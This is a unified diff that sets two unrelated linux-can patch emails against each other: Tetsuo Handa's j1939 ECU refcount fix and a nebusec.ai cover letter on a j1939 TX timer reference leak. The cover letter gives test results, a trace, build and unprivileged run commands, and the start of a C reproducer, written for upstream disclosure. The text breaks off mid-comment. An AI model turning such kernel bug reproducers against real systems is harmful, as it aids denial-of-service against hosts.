@@ -1,46 +1,98 @@
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=202.181.97.72
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.214.173
 ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
-	t=1793804034;
-	b=fG7Zhg1eZ97f0Fzkl+9zXRfuimpSmcoY5Khb5+VnRmjdz5R3oHfpFxdzlC9yGTFK1pJ2
-	 GePfyHaAeWs9UubOK5DpMa5ZhcBrjpFV63GDiDFKMxrQc0L2hg0bjZUMvcigQyhxm6EGU
-	 JcmRy5GOs/pwECVDxvsngQPUNSk0LVWazYHLKLHazFn/kECmXMmSpK/nlR97r9c/wl32o
-	 rtwAd32k/0GcLmg4PmQ6/vW1kM1NAuDnLA5eVidXG0wornVIDdA3DZpUoBzQY0WXg+D1C
-	 LYTNN70RZ6ojjuHGw90PV0z/VIOcCqqyTKe7tc0a4KQD9PqoYFy+raIXqKP/cj9H6RQ==
+	t=1793804562;
+	b=1vDNeIoBqIP5lgSybw6ngKvfQkes7bu3BY0jXj6EHydDmkWNWJxjlMN++AT+atlsIOHm
+	 R+am732S7NqwY82A2oQ5Gpt1HD1HLYwJ01568vsAkB15eqk7wZP+aUJRJvPy/bfCHalRi
+	 Kv9wxAupghgz2reExOWD/aK834V/P6cuHzke3Hpc8BGu5tp5rbL95k8/V3IWpJ9BuWdZG
+	 jlhcjP5tku7phA/0nysvqQdyy5n2Qqo+Jxmp8FMwUuif9aYTgpsYv8H9itvEmnqS3kCnD
+	 Tr7YVW33QVEbLHj+1pC9CjEhTudhbOx3K/RzqSf4Tac74F4Ru1LhxWZTgem00+bqaUQ==
 ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
-	a=rsa-sha256; c=relaxed/relaxed; t=1793804034;
-	h=DMARC-Filter:Received:Received:Message-ID:Date:MIME-Version:
-	 User-Agent:Content-Language:To:From:Subject:Content-Type:
-	 Content-Transfer-Encoding:X-Virus-Status:X-Anti-Virus-Server;
-	bh=pvOHK1aVUp0HIYqHcnjXYUL/TxnANS4pFRslG+QBuaA=;
-	b=0XJg2i9NSi5ZVkKFswNn2dNSiAoItsSThnJP6lxzL0go3yMcAGu7hi6CY18syZudNdFo
-	 8WiVqxPBBt64mvgM9/xN0QG/8D9q7dC5+fIx94Ry2UAe7molY8Js1/3yScx//cqfBj15C
-	 ZT+qJoHuhp3zYHOwIZNhV4iRcIyRMCEn4pAgYGT1oeieEiY6l1it6V+1HrL809uGWAQw6
-	 L8Bvx9BtsWDccPJwdopnPI+OU/Pc58wyx5i6mJn6/tVFvhaj3q0zBfAeRGwFSAHg1W3EC
-	 J6pSi5ssPJXjNPlhT/iYSEEuMLpmuWzWfKvOJIWsSE6kT7Rek+VM4L/b067Q28FI3OA==
+	a=rsa-sha256; c=relaxed/relaxed; t=1793804562;
+	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
+	 X-Gm-Message-State:X-Gm-Gg:X-Received:Received:From:To:Cc:Subject:
+	 Date:Message-ID:X-Mailer:MIME-Version:Content-Transfer-Encoding;
+	bh=3Dc8pGfW1+K5XrZW7zhfQZYMYpg1ROuZC1GtEo2njjQ=;
+	b=m70Cgr0INjIJr1akc5NV4oNtSJKlKgujJarO0FUpfh196FTPpqEktC37J2mh2d0IUMe8
+	 bsVZ6hkaDvfPam5RESgyxxsAy9uYWpGZuq82I3Gf+VAtForC3j7TMK4Kqkru7yG7OOUjI
+	 e4/Rkq1imdFhjKi/ItkPH2NNgLu0S6Bc+HXZOIfhVOIgffNXDOY6KW+v3MnfD6i8MEO3h
+	 BldcggVeHuR++KKzZp7+XKS/6FKY7fimganWizqH59gdNu13UIChdOXchNy65esScRwYh
+	 5EHwbm+k9oE5llEiM2G6qryWf8tLuXI0MkVKzzEVO9pX3loMdgFVn/n1UOoZ70epmXA==
 ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
-	dmarc=pass header.from=I-love.SAKURA.ne.jp;
-	spf=pass smtp.mailfrom=I-love.SAKURA.ne.jp;
-	arc=none smtp.remote-ip=202.181.97.72
-Received: from www262.sakura.ne.jp (www262.sakura.ne.jp [202.181.97.72])
-	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
+	dmarc=pass header.from=nebusec.ai;
+	spf=pass smtp.mailfrom=nebusec.ai;
+	dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=Mf7R9RNd;
+	arc=none smtp.remote-ip=209.85.214.173
+Received: from mail-pl1-f173.google.com (mail-pl1-f173.google.com [209.85.214.173])
+	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
+	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 9EE46606A326
-	for <linux-can@vger.kernel.org>; Wed,  4 Nov 2026 14:53:52 +0000 (UTC)
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 9EE46606A326
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=I-love.SAKURA.ne.jp
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=I-love.SAKURA.ne.jp
-Received: from www262.sakura.ne.jp (localhost [127.0.0.1])
-	by www262.sakura.ne.jp (8.15.2/8.15.2) with ESMTP id 6A4ErHX8056063;
-	Wed, 4 Nov 2026 23:53:17 +0900 (JST)
-	(envelope-from penguin-kernel@I-love.SAKURA.ne.jp)
-Received: from [192.168.1.6] (M106072072000.v4.enabler.ne.jp [106.72.72.0])
-	(authenticated bits=0)
-	by www262.sakura.ne.jp (8.15.2/8.15.2) with ESMTPSA id 6A4ErHGI056060
-	(version=TLSv1.2 cipher=AES256-GCM-SHA384 bits=256 verify=NO);
-	Wed, 4 Nov 2026 23:53:17 +0900 (JST)
-	(envelope-from penguin-kernel@I-love.SAKURA.ne.jp)
-Message-ID: <c9de355a-d66e-4f28-9636-a6fef8fe8b84@I-love.SAKURA.ne.jp>
-Date: Wed, 4 Nov 2026 23:53:14 +0900
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D63C5606A331
+	for <linux-can@vger.kernel.org>; Wed,  4 Nov 2026 15:02:41 +0000 (UTC)
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org D63C5606A331
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org;
+	dkim=pass (2048-bit key, unprotected) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=Mf7R9RNd
+Received: by mail-pl1-f173.google.com with SMTP id d9443c01a7336-2e5fb79ce82so4801355ad.0
+        for <linux-can@vger.kernel.org>; Wed, 04 Nov 2026 07:02:41 -0800 (PST)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=nebusec.ai; s=google; t=1793804561; x=1794409361; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=3Dc8pGfW1+K5XrZW7zhfQZYMYpg1ROuZC1GtEo2njjQ=;
+        b=Mf7R9RNduCKEEytzdM6GztZeussS76QnJvLmI0XbWs602B4IZeRXcAi2lM7kOCCaMO
+         ZXBBpe/TCZxdfn/U8YFWcRX6bsHZVL/wizn+GqrvzllBtsjMdFzdTlQ1g6Krx+LH2iaK
+         wwdoaQ5MrGwPi2EkIuLgkBxCyTNaAsqNwdTkRyrPddqgNL2rR6JXRBIlud+ROAzeMDmJ
+         17zRYFh3LJIObQ19d75fRZGNKA0C8UbHODY9IGS21aLvMho7lw8l8G9FIc3VJaXOFYPo
+         MP9L6mbT+ay7HXFTAKFTduaWncchbgo67sdpSJbQY+MAe4/Edyid+ssKb/GeykiXcrSE
+         X8xw==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20260707; t=1793804561; x=1794409361;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=3Dc8pGfW1+K5XrZW7zhfQZYMYpg1ROuZC1GtEo2njjQ=;
+        b=L8SU4nQ3N8HWFp5Zt/D40+uHfh54f3TtaYeJBr5SgCN7oQRGEmSHHfjSADVlAEaoDk
+         3lyPenIOQpzAwd36je89pP+m6rg3Xvu74TtpWLHOc8N8RI4EKksygI3/C5IQJODURoNe
+         hTNc6xs+12hPGbmUQ6J3aHX7XHMTm/olnqt/H+BO0LNhNxfPQUTwKbf+Be9Ej/UPGVvD
+         MsDQ+nd/I39bLkrAtan1a8KAvo8KkvRaGOvDnt1TD/tqtbVbRf5tvrUoRobLMgr311dt
+         dsfd1TBCmRdt/rZ3eBHVI01C0HnJjHWbr+wX+W7n3eyHHqz99yHAd0KDzg/VxrSsiWvh
+         vxUw==
+X-Gm-Message-State: APuU4Z+bC3kbs70fK02yInlfsmiXN+myZf7IFSkE77bPM2Jf8k3l8RrW
+	0xuDaVynBhfJTzGZgdaiv/Nt8FK6yCoz1bmvPp2IY74DmX1Vwwqqw/kTtLLvpNs2YbhbmbxlQYa
+	TbmT+q2UA
+X-Gm-Gg: AYBFou3o2zG4OicnrTlCtyW09eGEQlkTRDUHMJpBe8EpP+sKZc6a6mQtoDJ6UB2pI6w
+	wh+N8PmEm0oQfA12vC4/Qsc8bu7eUTIvXF4eY4+bge9bVLBKToCegGSzKN6htiyILPk9BBnwPiz
+	SfSpUmkc+RgBRyKkEiDoAsjuf0fto8JWw+fqYi92FkneqYbOc7tyDkN+0G8RKsbrIjcYAbyEK/t
+	GjMR/gEMkJxTi7itLnNE4S8GGsGhmA/aBbDw/XpwovOqaQ7uI4W5+j7uPO7MrAyXXUXW4KQ1wpj
+	r6lGBf9b32Se6In6q+GUUHFC5ScG2vRGwXA4Po3diLA5LbpONpJbc9D/14flw2gBKykw159coJu
+	TIMFoGzC0xEyhujZ5R+VGJRRjDQhWLWhG9fW0Bjc3ff9MPo8ZOkbZ3DjEpMv0nbJzlPudO8f4kY
+	Rih3Of1wyXuP+Kjbq6RoiawdcBkZMhezlYBGm9mtzOW5nFmRAbxqqIugeWseWBahypYUbFj5Lj4
+	MWQi1tDm2UJM8VYEU994CYU0mQCafhzhra2BeElWk7tvxuw9hP1+hd/usbWm0VmdOy0ky8RoglW
+	XeH+nB8yFCETKbTKx0AZBFp9PU5e8HL833T6xZcq0soewTVpgCwEyOCYRXN5
+X-Received: by 2002:a17:90b:2741:b0:3a0:e4ce:31fd with SMTP id 98e67ed59e1d1-3ae896f8304mr13971703a91.10.1793804560744;
+        Wed, 04 Nov 2026 07:02:40 -0800 (PST)
+Received: from 24c857d0c3be.. ([122.51.212.64])
+        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3b094d572e7sm2278456a91.1.2026.11.04.07.02.32
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Wed, 04 Nov 2026 07:02:39 -0800 (PST)
+From: Zihan Xi <zihanx@nebusec.ai>
+To: linux-can@vger.kernel.org
+Cc: robin@protonic.nl,
+	o.rempel@pengutronix.de,
+	kernel@pengutronix.de,
+	socketcan@hartkopp.net,
+	mkl@pengutronix.de,
+	lkp@intel.com,
+	bst@pengutronix.de,
+	dev.kurt@vandijck-laurijssen.be,
+	maxime.jayat@mobile-devices.fr,
+	vega@nebusec.ai,
+	zihanx@nebusec.ai
+Subject: [PATCH net v6 0/2] can: j1939: fix TX timer reference leak
+Date: Wed,  4 Nov 2026 15:02:25 +0000
+Message-ID: <cover.1793788955.git.zihanx@nebusec.ai>
+X-Mailer: git-send-email 2.47.3
 X-Mailing-List: linux-can@vger.kernel.org
 List-Id: <linux-can.vger.kernel.org>
 List-Post: <mailto:linux-can@vger.kernel.org>
@@ -50,489 +102,731 @@ List-Unsubscribe: <mailto:linux-can+unsubscribe@vger.kernel.org>
 List-Owner: <mailto:linux-can+owner@vger.kernel.org>
 Precedence: list
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-Content-Language: en-US
-To: linux-can@vger.kernel.org, Marc Kleine-Budde <mkl@pengutronix.de>,
-        Oleksij Rempel <o.rempel@pengutronix.de>,
-        Robin van der Gracht <robin@protonic.nl>, kernel@pengutronix.de,
-        Oliver Hartkopp <socketcan@hartkopp.net>
-From: Tetsuo Handa <penguin-kernel@I-love.SAKURA.ne.jp>
-Subject: [PATCH v6] can: j1939: fix j1939_ecu refcount leak and related race
- conditions
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: 7bit
-X-Virus-Status: clean
-X-Anti-Virus-Server: fsav212.rs.sakura.ne.jp
+Content-Transfer-Encoding: 8bit
 
-This is a squashed patch that fixes three bugs.
+Hi Linux kernel maintainers,
 
-Step 1: Fix possibility of list corruption in __j1939_ecu_release().
+We found a session-reference leak in net/can/j1939/transport.c.
+The issue is reachable by a user who can create user and network namespaces
+and send CAN frames to a J1939 receiver. The relevant details are provided
+below.
 
-  Since not all callers are calling j1939_ecu_put() with priv->lock held
-  for write, list corruption might happen if the last user called
-  j1939_ecu_put() without priv->lock held for write.
+---- details below ----
 
-  Fix this problem by deferring release steps to WQ context where we can
-  unconditionally hold priv->lock for write.
+An LLM was used to help create this patch.
 
-  By deferring to WQ context, readers might find ECUs which have already
-  reached __j1939_ecu_release(). Therefore, allow using an ECU only when
-  __j1939_ecu_release() is not yet called (indicated by ecu->kref > 0).
+This bug is tracked at: https://bugtracker.nebusec.ai/f/11143 (11143)
 
-Step 2: Fix possibility of deadlock in j1939_ecu_timer_cancel().
+Bug details:
 
-  Since j1939_ecu_timer_handler() takes priv->lock whereas hrtimer_cancel()
-  from j1939_ecu_timer_cancel() with priv->lock already held synchronously
-  waits for j1939_ecu_timer_handler() to complete, an AB-BA deadlock can
-  happen.
+Rearming an active TX hrtimer updates its expiry without queuing a second
+timer, but taking a session reference on every restart leaks references.
+A single reference must cover the queued timer and any running callback or
+queued successor. The TX and RX timer paths now protect that lifetime and
+serialize cancellation against rearming. Terminal paths publish shutdown
+before draining timers. Only the state-transition winner reports aborts or
+delivers a completed receive message.
 
-  Fix this problem by handing over from j1939_ecu_timer_handler() to
-  j1939_ecu_tasklet_handler() using ecu->flags for tracking the state of
-  handing over.
+The historical baseline PoC on the earlier CAN review baseline
+abeacca61eea4f6803df4a595b656ea45c2d3249 completed with POC_EXIT=0 and
+reproduced the timer-restart condition shown in the trace below. It did not
+crash. The final v6 candidate was rebased onto net/main
+787268686c64be60023743b527645a907e38ccca and built serially with KASAN,
+lockdep, and timer debug objects. On that rebased source, KASAN runs
+completed 64 EOMA/ABORT sessions and a combined 48-session TX/data workload
+plus 48-session RTS/ABORT workload without sanitizer, lockdep, refcount,
+timer, oops, or panic reports. Additional KASAN interaction runs on a
+preceding 7076f684-based worktree completed 64 CTS/ABORT and 64 concurrent
+RTS/ABORT sessions. The base J1939 subtree is byte-identical to selected
+787268686c64. The exact candidate source snapshot for these older runs was
+not retained; treat them as supplementary. KCSAN was also run on a
+preceding
+7076f684-based candidate, with KCSAN_VERBOSE, lockdep, and timer debug
+objects; its selftests passed 3/3. It completed 32 CTS/ABORT, 32
+concurrent RTS/ABORT, 32 EOMA/ABORT sessions and a combined 16-session
+TX/data workload
+plus 16-session RTS/ABORT workload without a KCSAN report. The exact KCSAN
+source mapping to this final v6 patch was not retained; these results are
+supplementary, not validation of the exact final source. KCSAN used its
+default non-strict mode. No crash was observed, so no crash log is
+available.
+These bounded stress runs do not force every exact callback/canceler
+interleaving.
 
-  The fix for step 1 makes it possible to call j1939_ecu_put() regardless
-  of whether priv->lock is held for write, and also makes it possible to
-  wait for ac_timer to complete using hrtimer_cancel() and wait for
-  ac_tasklet to complete using tasklet_kill() before kfree(ecu).
+Raw baseline trace excerpt (the second start updated an already armed
+timer):
 
-Step 3: Fix "struct j1939_ecu" refcount leak.
+             poc-389     [001] d.s2.   200.601390: hrtimer_start: hrtimer=ffffa3da4a2bc4b8 function=j1939_tp_txtimer expires=200464843123 softexpires=200464843123 mode=REL|SOFT was_armed=0
+             poc-390     [000] d.s2.   200.601400: hrtimer_start: hrtimer=ffffa3da4a2bc4b8 function=j1939_tp_txtimer expires=200464853253 softexpires=200464853253 mode=REL|SOFT was_armed=1
 
-  Since
+Changes in v6:
+- Split timer lifetime accounting from terminal TX/send serialization.
+- Patch 1 contains only timer-reference/lifetime handling and its required
+  timer shutdown/cleanup; it does not add TX-send lock state.
+- Patch 2 adds the TX-send shutdown gate and state-change serialization.
+- Preserve bounded KASAN/lockdep and KCSAN results; no crash was observed.
 
-    j1939_ecu_get(ecu);
-    priv->ents[ecu->addr] = ecu;
+Link: https://lore.kernel.org/all/cover.1793681851.git.zihanx@nebusec.ai/
 
-  in j1939_ecu_map_locked() from j1939_ecu_timer_handler() can succeed
-  even after
+Reproducer:
 
-    priv->ents[ecu->addr] = NULL;
-    j1939_ecu_put(ecu);
+The trigger uses raw CAN frames over namespace-local vxcan peers and a
+concurrent duplicate-frame burst; packetdrill does not model this
+CAN/J1939 device topology.
 
-  in j1939_ecu_unmap_locked() from j1939_ecu_unmap_all() from
-  __j1939_rx_release() from j1939_netdev_stop() has completed,
-  syzbot is reporting "struct j1939_ecu" refcount leak.
+Compile the reproducer with:
 
-    unregister_netdevice: waiting for vcan0 to become free. Usage count = 3
-    ref_tracker: netdev@ffff888038720720 has 1/2 users at
-         __netdev_tracker_alloc include/linux/netdevice.h:4554 [inline]
-         netdev_hold include/linux/netdevice.h:4583 [inline]
-         j1939_ecu_create_locked+0x1fc/0x4d0 net/can/j1939/bus.c:159
-         j1939_local_ecu_get+0x1b8/0x250 net/can/j1939/bus.c:293
-         j1939_sk_bind+0x89b/0xdb0 net/can/j1939/socket.c:529
-         __sys_bind_socket net/socket.c:1947 [inline]
-         __sys_bind_socket net/socket.c:1939 [inline]
-         __sys_bind+0x1a9/0x260 net/socket.c:1978
-         __do_sys_bind net/socket.c:1983 [inline]
-         __se_sys_bind net/socket.c:1981 [inline]
-         __x64_sys_bind+0x72/0xb0 net/socket.c:1981
-         do_syscall_x64 arch/x86/entry/syscall_64.c:61 [inline]
-         do_syscall_64+0x123/0x790 arch/x86/entry/syscall_64.c:84
-         entry_SYSCALL_64_after_hwframe+0x77/0x7f
+    gcc -O2 -Wall -Wextra -Werror -pthread -static -o poc poc.c
 
-    ref_tracker: netdev@ffff888038720720 has 1/2 users at
-         __netdev_tracker_alloc include/linux/netdevice.h:4554 [inline]
-         netdev_hold include/linux/netdevice.h:4583 [inline]
-         j1939_priv_create net/can/j1939/main.c:140 [inline]
-         j1939_netdev_start+0x2b8/0x990 net/can/j1939/main.c:268
-         j1939_sk_bind+0x479/0xdb0 net/can/j1939/socket.c:506
-         __sys_bind_socket net/socket.c:1947 [inline]
-         __sys_bind_socket net/socket.c:1939 [inline]
-         __sys_bind+0x1a9/0x260 net/socket.c:1978
-         __do_sys_bind net/socket.c:1983 [inline]
-         __se_sys_bind net/socket.c:1981 [inline]
-         __x64_sys_bind+0x72/0xb0 net/socket.c:1981
-         do_syscall_x64 arch/x86/entry/syscall_64.c:61 [inline]
-         do_syscall_64+0x123/0x790 arch/x86/entry/syscall_64.c:84
-         entry_SYSCALL_64_after_hwframe+0x77/0x7f
+Run it as an unprivileged account with user/network namespace support:
 
-  Fix this problem by canceling pending address claim timers from
-  j1939_ecu_unmap_all() and making j1939_ecu_get() fail unless three
-  conditions listed below are met.
+    unshare -Urn sh -c 'ip link add vxcan0 type vxcan peer name vxcan1 && ip link set vxcan0 up && ip link set vxcan1 up && ./poc vxcan0 vxcan1 2097152 4 32 4096 1'
 
-    (a) A netdev which is associated with j1939_priv is still registered
-        (indicated by priv->ndev->reg_state == NETREG_REGISTERED).
+We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment. The PoC creates
+four 2 MiB ETP sessions and concurrently sends duplicate terminal DATA
+packets over a vxcan pair.
 
-    (b) __j1939_rx_release() is not yet called (indicated by
-        priv->rx_kref > 0), for j1939_ecu_unmap_all() won't be called
-        again after __j1939_rx_release() from j1939_netdev_stop() from
-        j1939_netdev_notify(NETDEV_UNREGISTER) is once triggered.
+------BEGIN PoC------
+#define _GNU_SOURCE
 
-    (c) __j1939_ecu_release() is not yet called (indicated by
-        ecu->kref > 0)
+#include <errno.h>
+#include <linux/can.h>
+#include <linux/can/j1939.h>
+#include <linux/can/raw.h>
+#include <net/if.h>
+#include <poll.h>
+#include <pthread.h>
+#include <sched.h>
+#include <signal.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <time.h>
+#include <unistd.h>
 
-  The fix for step 1 makes it possible to call j1939_ecu_put() regardless
-  of whether priv->lock is held for write.
+#ifndef SYS_sendmmsg
+#define SYS_sendmmsg 307
+#endif
 
-Reported-by: syzbot+e2af46126e0644cbebdd@syzkaller.appspotmail.com
-Closes: https://syzkaller.appspot.com/bug?extid=e2af46126e0644cbebdd
-Link: https://lkml.kernel.org/r/179202402875.794844.18141702206663586949.b4-review@b4
-Fixes: 9d71dd0c7009 ("can: add support of SAE J1939 protocol")
-Signed-off-by: Tetsuo Handa <penguin-kernel@I-love.SAKURA.ne.jp>
----
-Previous version is "[PATCH v5] can: j1939: fix j1939_ecu refcount leak and related race conditions"
-at https://lkml.kernel.org/r/d0590019-f0c9-4288-9653-a7b6056012af@I-love.SAKURA.ne.jp .
+#define LOCAL_SA 0x80
+#define REMOTE_SA_BASE 0x81
+#define APP_PGN_BASE 0x01f100
 
- net/can/j1939/bus.c        | 172 ++++++++++++++++++++++++++++++++-----
- net/can/j1939/j1939-priv.h |   7 ++
- net/can/j1939/main.c       |  13 +++
- 3 files changed, 170 insertions(+), 22 deletions(-)
+#define J1939_ETP_PGN_CTL 0x00c800
+#define J1939_ETP_PGN_DAT 0x00c700
 
-diff --git a/net/can/j1939/bus.c b/net/can/j1939/bus.c
-index cdc3c0a71937..632e9aed6cf5 100644
---- a/net/can/j1939/bus.c
-+++ b/net/can/j1939/bus.c
-@@ -14,25 +14,62 @@
- 
- #include "j1939-priv.h"
- 
--static void __j1939_ecu_release(struct kref *kref)
-+struct workqueue_struct *j1939_ecu_wq;
-+
-+static void __j1939_ecu_release_work(struct work_struct *work)
- {
--	struct j1939_ecu *ecu = container_of(kref, struct j1939_ecu, kref);
-+	struct j1939_ecu *ecu = container_of(work, struct j1939_ecu, release_work);
- 	struct j1939_priv *priv = ecu->priv;
- 
-+	write_lock_bh(&priv->lock);
- 	list_del(&ecu->list);
-+	write_unlock_bh(&priv->lock);
-+	/* There can't be any ref on this ECU because __j1939_ecu_release()
-+	 * was already called. But we need to make sure that
-+	 * j1939_ecu_timer_handler() and j1939_ecu_tasklet_handler()
-+	 * are no longer running before kfree().
-+	 */
-+	WARN_ON(hrtimer_cancel(&ecu->ac_timer));
-+	tasklet_kill(&ecu->ac_tasklet);
- 	netdev_put(priv->ndev, &ecu->priv_dev_tracker);
- 	kfree(ecu);
- 	j1939_priv_put(priv);
- }
- 
-+static void __j1939_ecu_release(struct kref *kref)
-+{
-+	struct j1939_ecu *ecu = container_of(kref, struct j1939_ecu, kref);
-+
-+	/* Since not all callers are calling j1939_ecu_put() with priv->lock
-+	 * held for write, defer actual release to WQ context. By deferring to
-+	 * WQ context, priv->ecus readers might find ECUs with ecu->kref == 0.
-+	 * Therefore, priv->ecus readers must validate with j1939_ecu_valid() or
-+	 * j1939_ecu_get().
-+	 */
-+	INIT_WORK(&ecu->release_work, __j1939_ecu_release_work);
-+	queue_work(j1939_ecu_wq, &ecu->release_work);
-+}
-+
- void j1939_ecu_put(struct j1939_ecu *ecu)
- {
- 	kref_put(&ecu->kref, __j1939_ecu_release);
- }
- 
--static void j1939_ecu_get(struct j1939_ecu *ecu)
-+static __must_check bool j1939_ecu_get(struct j1939_ecu *ecu)
- {
--	kref_get(&ecu->kref);
-+	struct j1939_priv *priv = ecu->priv;
-+
-+	/* Don't get an ECU ref if netdev is no longer registered or
-+	 * __j1939_rx_release() was called or __j1939_ecu_release() was called.
-+	 */
-+	return READ_ONCE(priv->ndev->reg_state) == NETREG_REGISTERED &&
-+		kref_read(&priv->rx_kref) && kref_get_unless_zero(&ecu->kref);
-+}
-+
-+static __must_check bool j1939_ecu_valid(struct j1939_ecu *ecu)
-+{
-+	/* Treat an ECU as invalid if __j1939_ecu_release() was called. */
-+	return kref_read(&ecu->kref);
- }
- 
- static bool j1939_ecu_is_mapped_locked(struct j1939_ecu *ecu)
-@@ -56,15 +93,17 @@ static void j1939_ecu_map_locked(struct j1939_ecu *ecu)
- 	if (!j1939_address_is_unicast(ecu->addr))
- 		return;
- 
-+	if (!j1939_ecu_get(ecu))
-+		return;
-+
- 	ent = &priv->ents[ecu->addr];
- 
- 	if (ent->ecu) {
- 		netdev_warn(priv->ndev, "Trying to map already mapped ECU, addr: 0x%02x, name: 0x%016llx. Skip it.\n",
- 			    ecu->addr, ecu->name);
-+		j1939_ecu_put(ecu);
- 		return;
- 	}
--
--	j1939_ecu_get(ecu);
- 	ent->ecu = ecu;
- 	ent->nusers += ecu->nusers;
- }
-@@ -99,8 +138,17 @@ void j1939_ecu_unmap(struct j1939_ecu *ecu)
- void j1939_ecu_unmap_all(struct j1939_priv *priv)
- {
- 	int i;
-+	struct j1939_ecu *ecu;
- 
- 	write_lock_bh(&priv->lock);
-+	/* Although j1939_ecu_get() from j1939_ecu_map_locked() from
-+	 * j1939_ecu_tasklet_handler() will fail if netdev is no longer
-+	 * registered or __j1939_rx_release() was called, cancel the 250ms
-+	 * timer in order to speed up teardown operation.
-+	 */
-+	list_for_each_entry(ecu, &priv->ecus, list)
-+		j1939_ecu_timer_cancel(ecu);
-+	/* Unmap any remaining mapped ECUs */
- 	for (i = 0; i < ARRAY_SIZE(priv->ents); i++)
- 		if (priv->ents[i].ecu)
- 			j1939_ecu_unmap_locked(priv->ents[i].ecu);
-@@ -109,10 +157,11 @@ void j1939_ecu_unmap_all(struct j1939_priv *priv)
- 
- void j1939_ecu_timer_start(struct j1939_ecu *ecu)
- {
--	/* The ECU is held here and released in the
-+	/* The corresponding j1939_ecu_put() is in
- 	 * j1939_ecu_timer_handler() or j1939_ecu_timer_cancel().
- 	 */
--	j1939_ecu_get(ecu);
-+	if (!j1939_ecu_get(ecu))
-+		return;
- 
- 	/* Schedule timer in 250 msec to commit address change. */
- 	hrtimer_start(&ecu->ac_timer, ms_to_ktime(250),
-@@ -121,29 +170,99 @@ void j1939_ecu_timer_start(struct j1939_ecu *ecu)
- 
- void j1939_ecu_timer_cancel(struct j1939_ecu *ecu)
- {
-+	/* Drop the ref from j1939_ecu_timer_start() if j1939_ecu_timer_handler() was not called.
-+	 * Don't drop the ref from j1939_ecu_timer_start() if j1939_ecu_timer_handler() was already
-+	 * called.
-+	 */
- 	if (hrtimer_cancel(&ecu->ac_timer))
- 		j1939_ecu_put(ecu);
-+	/* Drop the ref from j1939_ecu_timer_handler() if test_and_set_bit() in
-+	 * j1939_ecu_timer_handler() succeeded and j1939_ecu_tasklet_handler() is not yet called.
-+	 * Don't drop the ref from j1939_ecu_timer_handler() if test_and_set_bit() in
-+	 * j1939_ecu_timer_handler() failed or j1939_ecu_tasklet_handler() was already called.
-+	 */
-+	if (test_and_clear_bit(0, &ecu->flags))
-+		j1939_ecu_put(ecu);
- }
- 
- static enum hrtimer_restart j1939_ecu_timer_handler(struct hrtimer *hrtimer)
- {
- 	struct j1939_ecu *ecu =
- 		container_of(hrtimer, struct j1939_ecu, ac_timer);
-+
-+	/* The corresponding j1939_ecu_put() is in
-+	 * j1939_ecu_tasklet_handler() or j1939_ecu_timer_cancel().
-+	 */
-+	if (!j1939_ecu_get(ecu))
-+		goto out;
-+
-+	/*
-+	 * Since we can't commit this address change from this context because we need to hold
-+	 * priv->lock for write before committing while hrtimer_cancel() (which waits for this
-+	 * context to complete) is called with priv->lock held for write, schedule
-+	 * j1939_ecu_tasklet_handler() (which takes priv->lock held for write from a different
-+	 * context) to commit this address change.
-+	 *
-+	 * The !test_and_set_bit() in j1939_ecu_timer_handler() and
-+	 * the test_and_clear_bit() in j1939_ecu_tasklet_handler() (or
-+	 * j1939_ecu_timer_cancel()) pair guarantees that
-+	 * the ref from j1939_ecu_timer_start() is dropped for exactly once.
-+	 *
-+	 * The !test_and_set_bit() condition here is likely true due to reasons listed below.
-+	 *
-+	 *   (1) j1939_ecu_timer_cancel(ecu) and j1939_ecu_timer_start(ecu) are
-+	 *       serialized by ecu->priv->lock
-+	 *   (2) scheduling of ecu->ac_tasklet does not happen if
-+	 *       hrtimer_cancel(&ecu->ac_timer) from j1939_ecu_timer_cancel(ecu) was
-+	 *       called before j1939_ecu_timer_handler(&ecu->ac_timer) is fired
-+	 *   (3) scheduling of ecu->ac_tasklet completes before
-+	 *       hrtimer_cancel(&ecu->ac_timer) from j1939_ecu_timer_cancel(ecu) returns
-+	 *       if j1939_ecu_timer_handler(&ecu->ac_timer) was fired before
-+	 *       hrtimer_cancel(&ecu->ac_timer) from j1939_ecu_timer_cancel(ecu) is
-+	 *       called
-+	 *   (4) ecu->ac_tasklet has shorter expiry time than ecu->ac_timer, which should
